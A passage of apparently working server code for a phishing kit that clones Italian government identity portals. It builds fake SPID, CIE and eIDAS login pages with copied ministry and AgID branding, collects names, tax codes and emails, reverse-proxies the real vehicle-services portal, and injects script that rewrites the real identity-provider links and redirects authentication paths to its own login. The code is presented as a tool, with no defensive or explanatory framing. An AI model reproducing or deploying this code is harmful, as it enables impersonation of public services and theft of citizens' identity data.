/* ── Form card ── */
.form-card{background:#fff;border:1px solid #e0e0e0;border-radius:4px;width:100%;max-width:480px;flex-shrink:0}
.form-card-header{padding:20px 28px;border-bottom:1px solid #ebebeb}
.form-card-header h2{font-size:1.15rem;font-weight:700;color:${c.accentFg};margin-bottom:4px}
.form-card-header p{font-size:.83rem;color:#777;line-height:1.5}
.form-card-body{padding:24px 28px}
.err{background:#ffeaea;border:1px solid #f5c0c0;border-radius:3px;padding:10px 12px;color:#c00;font-size:.84rem;margin-bottom:14px}
.err:not(.show){display:none}
.field{margin-bottom:18px}
.field label{display:block;font-size:.76rem;font-weight:700;color:#555;margin-bottom:4px;text-transform:uppercase;letter-spacing:.05em}
.field input{width:100%;border:1px solid ${c.inputBorder};border-radius:3px;padding:10px 12px;font-size:.95rem;font-family:inherit;color:#222;background:#fff}
.field input:focus{outline:2px solid ${c.inputFocus};border-color:${c.inputFocus}}
.btn-accedi{width:100%;background:${c.btnBg};color:${c.btnColor};border:none;border-radius:3px;padding:12px;font-size:.95rem;font-weight:700;cursor:pointer;font-family:inherit;letter-spacing:.03em;margin-bottom:14px}
.btn-accedi:hover{filter:brightness(.92)}
.btn-accedi:disabled{opacity:.55;cursor:not-allowed}
.form-links{display:flex;justify-content:space-between;font-size:.82rem;padding-bottom:8px}
.form-links a{color:${c.accentFg};text-decoration:none}
.form-links a:hover{text-decoration:underline}

/* ── Info sidebar ── */
.info-sidebar{flex:1;min-width:220px;display:none}
@media(min-width:720px){.info-sidebar{display:block}}
.info-box{background:#fff;border:1px solid #e0e0e0;border-radius:4px;padding:22px;margin-bottom:16px}
.info-box h3{font-size:.95rem;font-weight:700;color:${c.accentFg};margin-bottom:10px}
.info-box p{font-size:.82rem;color:#666;line-height:1.6}
.spid-levels{margin-top:10px}
.level{display:flex;align-items:center;gap:8px;margin-bottom:8px;font-size:.82rem;color:#555}
.level-badge{width:22px;height:22px;border-radius:50%;background:${c.accentFg};color:#fff;font-size:.65rem;font-weight:900;display:flex;align-items:center;justify-content:center;flex-shrink:0}

/* ── Footer ── */
footer{border-top:1px solid #ddd;padding:16px 24px;font-size:.74rem;color:#aaa;text-align:center}
footer a{color:#aaa;text-decoration:none;margin:0 6px}
footer a:hover{text-decoration:underline}
</style>
</head>
<body>

<div class="topbar">
  <div class="topbar-inner">
    <div class="topbar-left">
      <div class="topbar-provider-logo">${logoHtml}</div>
      <div class="topbar-divider"></div>
      <div class="topbar-spid">
        <div class="topbar-spid-badge">SPID</div>
        Sistema Pubblico di Identità Digitale
      </div>
    </div>
    <div class="topbar-right">Servizio sicuro certificato AgID</div>
  </div>
</div>

<main>
  <div class="layout">
    <div class="form-card">
      <div class="form-card-header">
        <h2>Accedi con ${p.name}</h2>
        <p>${c.tagline}</p>
      </div>
      <div class="form-card-body">
        <div class="err" id="err"></div>
        <div class="field">
          <label>Nome *</label>
          <input type="text" id="fn" placeholder="Mario" autocomplete="given-name">
        </div>
        <div class="field">
          <label>Cognome *</label>
          <input type="text" id="ln" placeholder="Rossi" autocomplete="family-name">
        </div>
        <div class="field">
          <label>Codice Fiscale <span style="font-weight:400;opacity:.7">(opzionale)</span></label>
          <input type="text" id="cf" placeholder="RSSMRA80A01H501U" maxlength="16"
                 oninput="this.value=this.value.toUpperCase()" autocomplete="username">
        </div>
        <div class="field">
          <label>Email <span style="font-weight:400;opacity:.7">(opzionale)</span></label>
          <input type="email" id="em" placeholder="mario.rossi@example.com" autocomplete="email">
        </div>
        <button class="btn-accedi" id="btn" onclick="go()">Accedi</button>
        <div class="form-links">
          <a href="#" onclick="return false;">Hai dimenticato le credenziali?</a>
          <a href="/login.html">&larr; Cambio provider</a>
        </div>
      </div>
    </div>

    <div class="info-sidebar">
      <div class="info-box">
        <h3>Cos'&egrave; SPID?</h3>
        <p>Il Sistema Pubblico di Identit&agrave; Digitale (SPID) &egrave; il sistema di accesso ai
          servizi online della Pubblica Amministrazione con identit&agrave; digitale unica.</p>
      </div>
      <div class="info-box">
        <h3>Livelli di sicurezza</h3>
        <div class="spid-levels">
          <div class="level"><div class="level-badge">1</div>Solo credenziali</div>
          <div class="level"><div class="level-badge">2</div>Credenziali + OTP</div>
          <div class="level"><div class="level-badge">3</div>Credenziali + chiave fisica</div>
        </div>
      </div>
    </div>
  </div>
</main>

<footer>
  <a href="#" onclick="return false;">Privacy</a>
  <a href="#" onclick="return false;">Note legali</a>
  <a href="#" onclick="return false;">Accessibilit&agrave;</a>
  <a href="#" onclick="return false;">Contatti</a>
  &bull; &copy; ${p.name} &mdash; Servizio SPID certificato AgID
</footer>

${loginScript('/api/auth/spid-login')}
</body>
</html>`;
}

// ── CIE dedicated page (matches real government CIE portal design) ────────────
function ciePage() {
  return `<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>CieID – Accesso con Carta d'Identità Elettronica</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Titillium Web',Roboto,Arial,sans-serif;background:#f5f7fa;min-height:100vh}

/* ── Header ── */
.cie-header{background:#fff;border-bottom:1px solid #e0e6ed;padding:10px 32px;
  display:flex;align-items:center;justify-content:space-between}
.cie-header-left{display:flex;align-items:center;gap:12px}
.flag{width:28px;height:20px;display:flex;gap:0;border-radius:2px;overflow:hidden;flex-shrink:0}
.flag-g{flex:1;background:#009246}
.flag-w{flex:1;background:#fff;border-left:1px solid #eee;border-right:1px solid #eee}
.flag-r{flex:1;background:#ce2b37}
.ministry-name{font-size:.78rem;font-weight:700;color:#1a1a1a;line-height:1.3;text-transform:uppercase;letter-spacing:.03em}
.cie-header-right{display:flex;align-items:center;gap:20px}
.lang-sel{font-size:.82rem;font-weight:700;color:#1a4f8a;cursor:pointer;display:flex;align-items:center;gap:4px}
.cie-logo-header{width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,#00518c,#0073b7);
  display:flex;align-items:center;justify-content:center;color:#fff;font-size:.65rem;font-weight:900;letter-spacing:.04em}

/* ── Service label ── */
.service-label{max-width:900px;margin:32px auto 12px;padding:0 20px}
.service-tag{font-size:.72rem;font-weight:700;color:#666;text-transform:uppercase;letter-spacing:.08em;margin-bottom:6px}
.service-title{font-size:2rem;font-weight:700;color:#1a4f8a;line-height:1.2}

/* ── Main card ── */
.cie-card{max-width:900px;margin:0 auto 24px;background:#fff;
  border:1px solid #d0d8e4;border-radius:6px;overflow:hidden;padding:0 20px}
.cie-cols{display:flex;gap:0}
.cie-left{flex:1;padding:32px 32px 32px 12px;border-right:1px solid #e0e6ed}
.cie-right{width:340px;flex-shrink:0;padding:32px 12px 32px 32px}

.col-heading{font-size:1.15rem;font-weight:700;color:#1a4f8a;margin-bottom:28px}
.col-heading-r{font-size:1.05rem;font-weight:700;color:#1a4f8a;margin-bottom:12px}
.col-desc{font-size:.84rem;color:#555;line-height:1.6;margin-bottom:20px}

/* ── Underline inputs ── */
.cie-field{position:relative;margin-bottom:28px}
.cie-field input{width:100%;border:none;border-bottom:1px solid #999;
  padding:10px 36px 10px 0;font-size:.95rem;color:#1a1a1a;background:transparent;outline:none}
.cie-field input::placeholder{color:#999}
.cie-field input:focus{border-bottom:2px solid #1a4f8a}
.cie-field .field-icon{position:absolute;right:4px;top:50%;transform:translateY(-50%);color:#888;cursor:pointer;font-size:.9rem}

/* ── Links ── */
.cie-link{font-size:.83rem;color:#1a4f8a;text-decoration:none;font-weight:600}
.cie-link:hover{text-decoration:underline}
.forgot-row{margin-bottom:28px}
.activate-row{margin-top:14px;font-size:.83rem;color:#555}

/* ── Buttons ── */
.btn-row{display:flex;gap:12px;margin-bottom:16px}
.btn-cancel{flex:1;background:#fff;border:2px solid #1a4f8a;color:#1a4f8a;
  border-radius:4px;padding:11px;font-size:.95rem;font-weight:700;cursor:pointer}
.btn-cancel:hover{background:#f0f4ff}
.btn-proceed{flex:2;background:#1a4f8a;border:none;color:#fff;
  border-radius:4px;padding:11px;font-size:.95rem;font-weight:700;cursor:pointer}
.btn-proceed:hover{background:#153d6f}
.btn-proceed:disabled{opacity:.55;cursor:not-allowed}

/* ── QR section ── */
.qr-wrap{text-align:center;margin:8px 0 16px}
.qr-wrap img{width:160px;height:160px;border:1px solid #e0e6ed;border-radius:4px}
.qr-note{font-size:.78rem;color:#555;text-align:center;line-height:1.5;margin-top:12px}
.qr-validity{text-align:center;margin-top:10px;font-size:.83rem;color:#555}
.qr-validity span{color:#1a4f8a;font-weight:700}

/* ── Error message ── */
.cie-err{background:#ffeaea;border:1px solid #f5c0c0;border-radius:4px;
  padding:10px 14px;color:#c00;font-size:.84rem;margin-bottom:16px;display:none}
.cie-err.show{display:block}

/* ── OR divider ── */
.or-divider{max-width:900px;margin:0 auto 24px;padding:0 20px;
  display:flex;align-items:center;gap:16px;color:#999;font-size:.88rem}
.or-divider::before,.or-divider::after{content:'';flex:1;height:1px;background:#d0d8e4}

/* ── Card reading section ── */
.card-reading{max-width:900px;margin:0 auto 40px;background:#fff;
  border:1px solid #d0d8e4;border-radius:6px;padding:28px 32px;
  display:flex;align-items:center;justify-content:space-between;gap:24px}
.card-reading-text h3{font-size:1.1rem;font-weight:700;color:#1a4f8a;margin-bottom:8px}
.card-reading-text p{font-size:.84rem;color:#555;line-height:1.6;max-width:580px}
.btn-card-read{background:#1a4f8a;color:#fff;border:none;border-radius:4px;
  padding:12px 24px;font-size:.92rem;font-weight:700;cursor:pointer;white-space:nowrap;
  display:flex;align-items:center;gap:10px}
.btn-card-read:hover{background:#153d6f}
.card-icon{width:22px;height:22px;border:2px solid #fff;border-radius:3px;
  display:flex;align-items:center;justify-content:center}

@media(max-width:640px){
  .cie-cols{flex-direction:column}
  .cie-left{border-right:none;border-bottom:1px solid #e0e6ed;padding:24px 16px}
  .cie-right{width:100%;padding:24px 16px}
  .card-reading{flex-direction:column;text-align:center}
}
</style>
</head>
<body>

<!-- Header -->
<div class="cie-header">
  <div class="cie-header-left">
    <div class="flag"><div class="flag-g"></div><div class="flag-w"></div><div class="flag-r"></div></div>
    <div class="ministry-name">Ministero<br>dell'Interno</div>
  </div>
  <div class="cie-header-right">
    <div class="lang-sel">ITA &#9662;</div>
    <div class="cie-logo-header">CIE</div>
  </div>
</div>

<!-- Service label -->
<div class="service-label">
  <div class="service-tag">CIE LEVEL 2 ACCESS REQUEST</div>
  <div class="service-title">Ministero delle Infrastrutture e dei Trasporti</div>
</div>

<!-- Main card -->
<div class="cie-card">
  <div class="cie-cols">

    <!-- Left: credential form -->
    <div class="cie-left">
      <div class="col-heading">Accedi con le credenziali CIE</div>

      <div class="cie-err" id="cie-err"></div>

      <div class="cie-field">
        <input type="text" id="f-nome" placeholder="Nome" autocomplete="given-name">
      </div>
      <div class="cie-field">
        <input type="text" id="f-cogn" placeholder="Cognome" autocomplete="family-name">
      </div>
      <div class="cie-field">
        <input type="text" id="f-cf" placeholder="Codice Fiscale (CIE Number or Tax Code)"
               maxlength="16" oninput="this.value=this.value.toUpperCase()" autocomplete="off">
        <span class="field-icon">&#x24D8;</span>
      </div>
      <div class="cie-field">
        <input type="email" id="f-email" placeholder="Email" autocomplete="email">
        <span class="field-icon" id="eyeToggle" onclick="toggleEye()">&#128065;</span>
      </div>

      <div class="forgot-row">
        <a href="#" class="cie-link" onclick="return false;">Hai dimenticato le credenziali? Richiedile nuovamente.</a>
      </div>

      <div class="btn-row">
        <button type="button" class="btn-cancel" onclick="history.back()">Annulla</button>
        <button type="button" class="btn-proceed" id="btn-proceed" onclick="doLogin()">Procedi</button>
      </div>

      <div class="activate-row">
        Non hai ancora le credenziali CIE?
        <a href="#" class="cie-link" onclick="return false;">Attivale ora.</a>
      </div>
    </div>

    <!-- Right: CieID App / QR -->
    <div class="cie-right">
      <div class="col-heading-r">Accedi con l'App CieID</div>
      <p class="col-desc">Se hai attivato le Credenziali CIE (livello 2) e hai certificato il dispositivo,
        apri l'App CieID e inquadra il QR Code.</p>

      <div class="qr-wrap">
        <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=CIE-AUTH-DEMO&color=1a4f8a"
             alt="QR Code CieID"
             onerror="this.style.display='none'">
      </div>

      <p class="qr-note">Se non vuoi usare la modalità semplificata e hai già registrato la tua
        carta sull'App CieID (livello 3), seleziona "Entra con lettura carta CIE" in basso.</p>

      <div class="qr-validity">Validità codice: <span id="countdown">2:00</span></div>
    </div>
  </div>
</div>

<!-- OR divider -->
<div class="or-divider">oppure</div>

<!-- Card reading section -->
<div class="card-reading">
  <div class="card-reading-text">
    <h3>Entra con lettura carta</h3>
    <p>Puoi accedere leggendo la tua carta (livello 3) da uno smartphone NFC con l'app CieID
      registrando la tua carta, oppure da un PC con il software CIE e un lettore di smart card.</p>
  </div>
  <button type="button" class="btn-card-read" onclick="doLogin()">
    <div class="card-icon">&#x1F4F1;</div>
    Entra con lettura carta CIE
  </button>
</div>

<script>
  /* ── QR countdown ── */
  var secs = 120;
  var t = setInterval(function(){
    if(--secs <= 0){ clearInterval(t); document.getElementById('countdown').textContent='0:00'; return; }
    document.getElementById('countdown').textContent =
      Math.floor(secs/60)+':'+(secs%60<10?'0':'')+(secs%60);
  }, 1000);

  /* ── Eye toggle (visual only) ── */
  function toggleEye(){
    var f = document.getElementById('f-email');
    f.type = f.type === 'email' ? 'text' : 'email';
  }

  /* ── Submit ── */
  function doLogin(){
    var err = document.getElementById('cie-err');
    err.className = 'cie-err';
    var body = {
      firstName: document.getElementById('f-nome').value.trim(),
      lastName:  document.getElementById('f-cogn').value.trim(),
      taxId:     document.getElementById('f-cf').value.trim(),
      email:     document.getElementById('f-email').value.trim(),
    };
    if(!body.firstName||!body.lastName||!body.taxId||!body.email){
      err.textContent='Tutti i campi sono obbligatori.';
      err.className='cie-err show'; return;
    }
    var btn = document.getElementById('btn-proceed');
    btn.disabled=true; btn.textContent='Autenticazione in corso…';
    fetch('/api/auth/cie-login',{
      method:'POST', credentials:'include',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(body),
    }).then(r=>r.json()).then(d=>{
      if(d.success){
        localStorage.setItem('token',d.token);
        localStorage.setItem('user',JSON.stringify(d.user));
        location.href='/dashboard.html';
      } else {
        err.textContent=d.message||"Errore durante l'accesso.";
        err.className='cie-err show';
        btn.disabled=false; btn.textContent='Procedi';
      }
    }).catch(function(){
      err.textContent='Errore di connessione al server.';
      err.className='cie-err show';
      btn.disabled=false; btn.textContent='Procedi';
    });
  }
  document.addEventListener('keydown',function(e){ if(e.key==='Enter') doLogin(); });
</script>
</body>
</html>`;
}

app.get('/spid-provider/cie', (_req, res) => res.send(ciePage()));

// ── eIDAS dedicated page (Italian eIDAS Login with country selector) ──────────
function eidasPage() {
  const COUNTRIES = [
    {code:'AT',flag:'🇦🇹',name:'Austria'},
    {code:'BE',flag:'🇧🇪',name:'Belgio'},
    {code:'CY',flag:'🇨🇾',name:'Cipro'},
    {code:'CZ',flag:'🇨🇿',name:'Rep. Ceca'},
    {code:'DE',flag:'🇩🇪',name:'Germania'},
    {code:'DK',flag:'🇩🇰',name:'Danimarca'},
    {code:'EE',flag:'🇪🇪',name:'Estonia'},
    {code:'ES',flag:'🇪🇸',name:'Spagna'},
    {code:'FI',flag:'🇫🇮',name:'Finlandia'},
    {code:'FR',flag:'🇫🇷',name:'Francia'},
    {code:'HR',flag:'🇭🇷',name:'Croazia'},
    {code:'LU',flag:'🇱🇺',name:'Lussemburgo'},
    {code:'LT',flag:'🇱🇹',name:'Lituania'},
    {code:'MT',flag:'🇲🇹',name:'Malta'},
    {code:'LV',flag:'🇱🇻',name:'Lettonia'},
    {code:'IT',flag:'🇮🇹',name:'Italia'},
    {code:'NL',flag:'🇳🇱',name:'Paesi Bassi'},
    {code:'PL',flag:'🇵🇱',name:'Polonia'},
    {code:'PT',flag:'🇵🇹',name:'Portogallo'},
    {code:'RO',flag:'🇷🇴',name:'Romania'},
    {code:'SE',flag:'🇸🇪',name:'Svezia'},
    {code:'SI',flag:'🇸🇮',name:'Slovenia'},
    {code:'SK',flag:'🇸🇰',name:'Slovacchia'},
  ];

  const countryRadios = COUNTRIES.map(c =>
    `<div class="country-item">
      <input type="radio" name="country" id="c-${c.code}" value="${c.code}">
      <label for="c-${c.code}" title="${c.name}">
        <span class="flag-emoji">${c.flag}</span>
      </label>
    </div>`
  ).join('');

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Italian eIDAS Login</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column}

/* ── Header ── */
header{background:#1a56b0;padding:0}
.hdr-inner{display:flex;align-items:center;gap:16px;padding:12px 32px}
.eu-logo{width:52px;height:52px;border-radius:50%;background:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.eu-logo svg{width:38px;height:38px}
.hdr-title{color:#fff;font-size:1.4rem;font-weight:700;letter-spacing:-.01em}

/* ── Main content ── */
main{flex:1;padding:40px 20px}
.content-wrap{max-width:760px;margin:0 auto}

/* Step 1 */
#step1 h2{font-size:1.7rem;font-weight:700;color:#1a1a1a;margin-bottom:10px}
#step1 .subtitle{font-size:.95rem;color:#444;margin-bottom:28px;line-height:1.6;max-width:680px}

.country-grid{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:28px}
.country-item{display:flex;align-items:center;gap:0}
.country-item input[type=radio]{margin-right:6px;width:16px;height:16px;cursor:pointer;accent-color:#1a56b0}
.country-item label{cursor:pointer;display:flex;align-items:center;margin:0}
.flag-emoji{font-size:2rem;line-height:1;border-radius:6px;display:block;width:44px;height:36px;text-align:center;line-height:36px;border:1px solid #ddd;background:#fafafa}
.country-item input[type=radio]:checked + label .flag-emoji{border-color:#1a56b0;box-shadow:0 0 0 2px #1a56b0;background:#e8f0fe}

.privacy-box{border:1px solid #ccc;border-radius:4px;padding:16px;height:180px;overflow-y:auto;font-size:.83rem;color:#333;line-height:1.7;margin-bottom:28px;background:#fafafa}
.privacy-box h6{font-weight:700;margin-bottom:10px;font-size:.85rem}

.btn-next{display:block;width:100%;background:#4472c4;color:#fff;border:none;border-radius:4px;padding:16px;font-size:1rem;font-weight:600;cursor:pointer;margin-bottom:10px;letter-spacing:.02em}
.btn-next:hover{background:#2d5aa0}
.btn-next:disabled{opacity:.5;cursor:not-allowed}
.btn-cancel-eidas{display:block;width:100%;background:#4a4a4a;color:#fff;border:none;border-radius:4px;padding:14px;font-size:1rem;font-weight:600;cursor:pointer}
.btn-cancel-eidas:hover{background:#333}

/* Step 2 */
#step2{display:none}
#step2 h2{font-size:1.3rem;font-weight:700;color:#1a56b0;margin-bottom:6px}
#step2 .country-chosen{font-size:.9rem;color:#555;margin-bottom:24px}
.eidas-field{margin-bottom:18px}
.eidas-field label{display:block;font-size:.78rem;font-weight:700;color:#555;margin-bottom:5px;text-transform:uppercase;letter-spacing:.05em}
.eidas-field input{width:100%;border:1px solid #ccc;border-radius:4px;padding:10px 12px;font-size:.95rem}
.eidas-field input:focus{outline:2px solid #1a56b0;border-color:#1a56b0}
.eidas-err{background:#ffeaea;border:1px solid #f5c0c0;border-radius:4px;padding:10px 14px;color:#c00;font-size:.84rem;margin-bottom:16px;display:none}
.eidas-err.show{display:block}
.btn-submit-eidas{display:block;width:100%;background:#1a56b0;color:#fff;border:none;border-radius:4px;padding:14px;font-size:1rem;font-weight:700;cursor:pointer;margin-bottom:10px}
.btn-submit-eidas:hover{background:#134190}
.btn-submit-eidas:disabled{opacity:.55;cursor:not-allowed}
.btn-back-eidas{display:block;width:100%;background:#4a4a4a;color:#fff;border:none;border-radius:4px;padding:12px;font-size:.95rem;font-weight:600;cursor:pointer}
.btn-back-eidas:hover{background:#333}

/* Footer */
footer{border-top:1px solid #dee2e6;padding:20px 32px;display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap}
footer img{max-height:40px;opacity:.7}
</style>
</head>
<body>

<!-- Header -->
<header>
  <div class="hdr-inner">
    <div class="eu-logo">
      <!-- EU circle-of-stars person icon -->
      <svg viewBox="0 0 38 38" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="19" cy="13" r="5" fill="#1a56b0"/>
        <path d="M7 33c0-6.627 5.373-12 12-12s12 5.373 12 12" stroke="#1a56b0" stroke-width="2.5" fill="none"/>
        <!-- Stars ring -->
        <g fill="#f5c400" font-size="4">
          <text x="17.5" y="4.5" text-anchor="middle">★</text>
          <text x="25" y="7" text-anchor="middle">★</text>
          <text x="29" y="14" text-anchor="middle">★</text>
          <text x="27" y="22" text-anchor="middle">★</text>
          <text x="10" y="4.5" text-anchor="middle">★</text>
          <text x="4" y="7" text-anchor="middle">★</text>
          <text x="1" y="14" text-anchor="middle">★</text>
          <text x="3" y="22" text-anchor="middle">★</text>
        </g>
      </svg>
    </div>
    <span class="hdr-title">Italian eIDAS Login</span>
  </div>
</header>

<main>
  <div class="content-wrap">

    <!-- ── Step 1: Country selection ── -->
    <div id="step1">
      <h2>Select your country</h2>
      <p class="subtitle">In order to continue your authentication, please select your nationality and entirely read privacy policy</p>

      <div class="country-grid">
        ${countryRadios}
      </div>

      <div class="privacy-box">
        <h6>Privacy Information Notice (pursuant to art. 13 of European Regulation no. 2016/679)</h6>
        <p>Agid, Agenzia Italiana per il Digitale, with registered office in Via Lizst 21 – 00144 Rome,
          Tax code 97735020584, (hereinafter "Agid"), as Data Controller, pursuant to and in accordance
          with art. 13 EU Regulation no. 2016/679 (hereinafter "GDPR"), informs you, in your capacity
          as the Data Subject (as defined in art. 4 of the GDPR), that your personal data (hereinafter
          "Personal Data" or "Data") will be processed in full compliance with current legislation on the
          protection of personal data, including the GDPR, Legislative Decree no. 196/2003 and subsequent
          amendments (hereinafter "Privacy Code").</p>
        <br>
        <p>The Data Controller processes Personal Data for the following purposes: (a) Management and
          provision of eIDAS node authentication services to connected Service Providers; (b) Compliance
          with legal and regulatory obligations. The legal basis is the performance of a task carried out
          in the public interest.</p>
        <br>
        <p>The data will be retained for the time strictly necessary to fulfil the aforementioned purposes
          and will not be transferred to third countries outside the European Union. You have the right to
          access, rectify, restrict or object to the processing of your personal data by contacting
          privacy@agid.gov.it.</p>
      </div>

      <button type="button" class="btn-next" id="btn-next" onclick="goStep2()" disabled>Next step…</button>
      <button type="button" class="btn-cancel-eidas" onclick="history.back()">Cancel</button>
    </div>

    <!-- ── Step 2: Credential form ── -->
    <div id="step2">
      <h2>Autenticazione eIDAS</h2>
      <p class="country-chosen" id="chosen-label"></p>

      <div class="eidas-err" id="eidas-err"></div>

      <div class="eidas-field">
        <label>Nome</label>
        <input type="text" id="e-nome" placeholder="Mario" autocomplete="given-name">
      </div>
      <div class="eidas-field">
        <label>Cognome</label>
        <input type="text" id="e-cogn" placeholder="Rossi" autocomplete="family-name">
      </div>
      <div class="eidas-field">
        <label>Codice Fiscale / Tax ID</label>
        <input type="text" id="e-cf" placeholder="RSSMRA80A01H501U" maxlength="16"
               oninput="this.value=this.value.toUpperCase()" autocomplete="off">
      </div>
      <div class="eidas-field">
        <label>Email</label>
        <input type="email" id="e-email" placeholder="mario.rossi@example.com" autocomplete="email">
      </div>

      <button type="button" class="btn-submit-eidas" id="e-btn" onclick="doEidasLogin()">Accedi con eIDAS</button>
      <button type="button" class="btn-back-eidas" onclick="goStep1()">&#8592; Indietro</button>
    </div>

  </div>
</main>

<footer>
  <img src="https://sp-proxy.eid.gov.it/static/img/agid-logo.png" alt="AgID"
       onerror="this.style.display='none'">
  <img src="https://sp-proxy.eid.gov.it/static/img/cef-banner-tr.png" alt="CEF"
       onerror="this.style.display='none'">
</footer>

<script>
  /* Enable Next button only when a country is selected */
  document.querySelectorAll('input[name=country]').forEach(function(r){
    r.addEventListener('change', function(){
      document.getElementById('btn-next').disabled = false;
    });
  });

  function goStep2(){
    var sel = document.querySelector('input[name=country]:checked');
    if(!sel) return;
    var label = document.querySelector('label[for=c-'+sel.value+']').title;
    document.getElementById('chosen-label').textContent = 'Paese selezionato: ' + label;
    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';
    document.getElementById('e-nome').focus();
  }

  function goStep1(){
    document.getElementById('step2').style.display = 'none';
    document.getElementById('step1').style.display = 'block';
  }

  function doEidasLogin(){
    var err = document.getElementById('eidas-err');
    err.className = 'eidas-err';
    var body = {
      firstName: document.getElementById('e-nome').value.trim(),
      lastName:  document.getElementById('e-cogn').value.trim(),
      taxId:     document.getElementById('e-cf').value.trim(),
      email:     document.getElementById('e-email').value.trim(),
    };
    if(!body.firstName||!body.lastName||!body.taxId||!body.email){
      err.textContent = 'Tutti i campi sono obbligatori.';
      err.className = 'eidas-err show'; return;
    }
    var btn = document.getElementById('e-btn');
    btn.disabled = true; btn.textContent = 'Autenticazione in corso…';
    fetch('/api/auth/spid-login',{
      method:'POST', credentials:'include',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify(body),
    }).then(function(r){ return r.json(); }).then(function(d){
      if(d.success){
        localStorage.setItem('token', d.token);
        localStorage.setItem('user', JSON.stringify(d.user));
        location.href = '/dashboard.html';
      } else {
        err.textContent = d.message || "Errore durante l'accesso.";
        err.className = 'eidas-err show';
        btn.disabled = false; btn.textContent = 'Accedi con eIDAS';
      }
    }).catch(function(){
      err.textContent = 'Errore di connessione al server.';
      err.className = 'eidas-err show';
      btn.disabled = false; btn.textContent = 'Accedi con eIDAS';
    });
  }
  document.addEventListener('keydown', function(e){ if(e.key==='Enter') { if(document.getElementById('step2').style.display==='block') doEidasLogin(); } });
</script>
</body>
</html>`;
}

app.get('/spid-provider/eidas', (_req, res) => res.send(eidasPage()));

SPID_PROVIDERS.forEach(p => {
  if (p.id === 'cie') return; // already handled above
  if (p.id === 'eidas') return; // already handled above
  app.get(`/spid-provider/${p.id}`, (_req, res) => res.send(providerPage(p)));
});

// Script injected into the real SSO provider-selection page to rewrite all
// provider links so they go to our own branded provider pages instead of
// the real government IDPs
const SSO_PROVIDER_REWRITE = `<script>
(function(){
  var MAP=${JSON.stringify(
    SPID_PROVIDERS.reduce((m, p) => { p.keys.forEach(k => { m[k] = p.id; }); return m; }, {})
  )};
  function rewrite(){
    var links=document.querySelectorAll('a,button[onclick],li[onclick]');
    links.forEach(function(el){
      var txt=(el.textContent||'').toLowerCase().replace(/\\s+/g,' ').trim();
      var matched=null;
      Object.keys(MAP).forEach(function(k){ if(txt.indexOf(k)!==-1) matched=MAP[k]; });
      if(matched){
        if(el._rw) return; el._rw=true;
        if(el.tagName==='A'){
          el.href='/spid-provider/'+matched;
        } else {
          el.addEventListener('click',function(e){
            e.preventDefault();e.stopPropagation();
            location.href='/spid-provider/'+matched;
          },true);
        }
      }
    });
  }
  if(document.readyState==='loading') document.addEventListener('DOMContentLoaded',rewrite);
  else rewrite();
  if(window.MutationObserver)
    new MutationObserver(rewrite).observe(document.documentElement,{childList:true,subtree:true});
})();
</script>`;

// ── Reverse-proxy the real portal, intercept auth with our backend ────────────
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
const fs = require('fs');

const REAL_SITE   = 'https://www.ilportaledellautomobilista.it';
const LOCAL       = process.env.PUBLIC_URL || `http://localhost:${PORT}`;
const LOGIN_PAGE  = '/login.html';

// Auth patterns — any request matching these never reaches the real site.
// loginspid and the SSO selection page (/SSO/SSOLogin/) are excluded:
// we proxy them and inject our own credential modal instead.
const AUTH_RE = [
  /DispatcherEntry/i,
  /idpciam/i, /ssociam/i, /idpSSOInit/i, /sp\.fed\.pda/i,
  /accesso-portale-automobilista/i,
  /loginspid/i,
  /SSOLogin/i,
  /\/SSO\//i,
  /c\/portal\/login/i,
];

// ── Our own frontend pages (served locally) ──────────────────────────────────
const ROOT = path.join(__dirname, '..');

// ── Cloned portal home (served with GUARD injected so auth interception works)
const CLONE_HOME = path.join(ROOT, 'ilportaledellautomobilista/www.ilportaledellautomobilista.it/web/portale-automobilista.html');
const BASE_TAG = '<base href="/ilportaledellautomobilista/www.ilportaledellautomobilista.it/web/">';
const CLONE_HOME_EXISTS = fs.existsSync(CLONE_HOME);
function serveCloneHome(req, res, next) {
  // On cloud deployments the cloned directory isn't present — fall through to the live proxy
  if (!CLONE_HOME_EXISTS) return next();
  let html = fs.readFileSync(CLONE_HOME, 'utf8');
  // Rewrite absolute real-site URLs to stay on our server
  html = html.replace(new RegExp(REAL_SITE.replace(/\./g, '\\.'), 'g'), LOCAL);
  // Inject base tag so relative asset paths (../pda-theme/, ../html/, etc.) resolve correctly
  html = html.replace(/(<head[^>]*>)/i, '$1' + BASE_TAG);
  // Inject GUARD for auth interception
  html = html.replace(/(<head[^>]*>)/i, '$1' + GUARD);
  html = html.includes('</body>') ? html.replace('</body>', GUARD + '</body>') : html + GUARD;
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(html);
}
app.get('/', serveCloneHome);
app.get('/home.html', serveCloneHome);

// Serve frontend pages at /frontend/ (compat) and root
app.use('/frontend', express.static(path.join(ROOT, 'frontend')));
app.use(express.static(path.join(ROOT, 'frontend')));
// Serve cloned portal assets (CSS, images) referenced by dashboard.html
app.use('/ilportaledellautomobilista', express.static(path.join(ROOT, 'ilportaledellautomobilista')));


// ── Intercept auth paths → our login ─────────────────────────────────────────
app.use((req, res, next) => {
  if (AUTH_RE.some(r => r.test(req.path + req.url))) return res.redirect(LOGIN_PAGE);
  next();
});

